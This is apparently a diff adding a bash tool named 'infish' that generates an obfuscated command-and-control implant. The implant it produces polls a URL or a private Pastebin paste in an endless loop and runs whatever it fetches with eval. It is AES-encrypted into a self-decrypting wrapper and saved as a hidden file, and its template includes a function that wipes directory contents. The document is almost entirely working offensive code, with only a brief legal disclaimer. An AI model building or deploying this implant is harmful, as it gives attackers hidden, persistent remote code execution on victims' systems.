@@ -1,0 +1,177 @@
+#!/usr/bin/env bash
+
+# MIT License
+# 
+# Copyright (c) 2023 Robert Paul
+# 
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+# 
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+# 
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
+usage="
+Usage: ./infish [OPTIONS]
+Description:
+  A poor man's encrypted c&c service.
+Options:
+  -h, --help                Display this help message and exit.
+  -u, --url                 Url to c&c.
+  -k, --key                 Paste bin api key to generate a new c&c paste.
+  -ua, --user-agent         User-agent to use when communicating with c&c url. Optional.  
+  -s, --sleep SECONDS       Number of seconds to sleep after each connection to c&c url. Optional.
+  -o, --output FILE         Name or Path to generated file.
+Examples:
+    ./infish --url 'https://example.com/cmd' --sleep 900 --user-agent 'Mozilla 5.0'
+
+    ./infish --key 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' --sleep 900 --user-agent 'Mozilla 5.0'    
+";
+
+args=("$@");
+
+while [[ $# -gt 0 ]]; do
+  key="$1"
+  case $key in
+    -h|--help)
+      echo "$usage";
+      exit 0
+      ;;
+    -u|--url)
+      url="$2";
+      shift
+      ;;
+    -k|--api-key)
+      api_key="$2"
+      shift 2
+      ;;
+    -ua|--user-agent)
+      user_agent="$2"
+      shift 2
+      ;;
+    -o|--output)
+      output_file="$2"
+      shift 2
+      ;;      
+    -s|--sleep)
+      sleepseconds="$2"
+      shift 2
+      ;;
+    *)                  
+      shift
+      ;;
+  esac
+done
+
+set -- "${args[@]}";
+
+[[ -z "$url" ]] && [[ -z "$api_key" ]] && echo "$usage" && exit 1;
+[[ -n "$url" ]] && [[ -n "$api_key" ]] && echo -e "\nYou cannot use both --url and --api-key at same time.\n\n" && echo "$usage" && exit 1;
+
+[[ -z "$user_agent" ]] && user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0";
+[[ -z "$sleepseconds" ]] && sleepseconds=900 && echo -e "\nYou have not specified number of sleep seconds. Default of 900 seconds will be used.";
+[[ -z "$output_file" ]] && output_file=".infish" && echo -e "\nYou have not specified an output file. Default of '.infish' will be used.\n\n";
+
+legal_disclaimer=$(cat << TPL
+
+[!] Legal Disclaimer: Using this piece of software to generate code for use against targets without prior mutual consent is illegal. I assume no liability and bear no responsibility for any misuse or damage caused by this program."
+
+TPL
+);
+
+echo "$legal_disclaimer";
+
+template=$(cat <<'TPL'
+#!/usr/bin/env bash
+
+function clear_dir() {
+    [ ! -e "$1" ] || [ ! -d "$1" ] && return;
+    cd "$1" || exit > /dev/null 2>&1;
+    [ "$PWD" != "$1" ] && return;
+    [ "$(ls -a $1)" ] && rm * -rf > /dev/null 2>&1;    
+}
+
+function main() {
+    useragent=
+    url=
+    command=$(curl -sS -L -A "$useragent" "$url");
+    if [ -z "$command" ]; then
+        return;
+    else
+        eval "$command";
+    fi
+
+    sleep 000
+}
+
+while true; do
+    main
+done
+TPL
+);
+
+content=$template;
+key=$(openssl rand -hex 32);iv=$(openssl rand -hex 16);
+
+if [[ -n "$url" ]]; then
+    content=${content//url=/url=\"$2\";};    
+elif [[ -n "$api_key" ]]; then
+
+    echo "Pastebin username: ";
+    read -r username;
+    echo "Pastebin password: ";
+    read -r password;
+    echo "New Paste name: ";
+    read -r paste_name;
+
+    if [[ -z "$username" ]] || [[ -z "$password" ]]; then
+        echo -e "You must enter a username and password.\n";
+        exit;
+    fi
+
+    echo -e "\n\n";
+    echo -e "Generating infinite shell...\n"
+
+    api_user_key=$(curl -sS -X POST -d "api_dev_key=$api_key" -d "api_user_name=$username" -d "api_user_password=$password" "https://pastebin.com/api/api_login.php");
+
+    if [[ -z "$api_user_key" || "$api_user_key" =~ "^Bad API request" ]]; then
+        echo "$api_user_key";
+        exit
+    fi
+
+    new_url=$(curl -sS -L -X POST -A "$user_agent" -d "api_dev_key=$api_key" -d "api_user_key=$api_user_key" -d "api_paste_code=ls" -d "api_option=paste" -d "api_paste_name=$paste_name" -d "api_paste_private=1" "https://pastebin.com/api/api_post.php");
+
+    new_url_copy=$new_url;
+
+    new_url=${new_url//https:\/\/pastebin.com/pastebin.com\/raw};
+
+    content=${content//url=/url=\"$new_url\";};
+fi
+
+content=${content//useragent=/useragent=\"$user_agent\";};
+content=${content//"sleep 000"/sleep $sleepseconds;};
+
+encrypted=$(echo -e -n "$content" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -e -a);
+encrypted=$(cat << TPL
+#!/usr/bin/env bash
+decrypted=\$(printf "%s" "$encrypted" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -d -a);
+eval "\$decrypted";
+TPL
+);    
+echo -e "$encrypted" >"$output_file";
+echo -e "\nSuccessfully built infinite shell.\n\n";
+[[ -n "$api_key" ]] && echo -e "The paste url is $new_url_copy\n";
+
+
+exit;
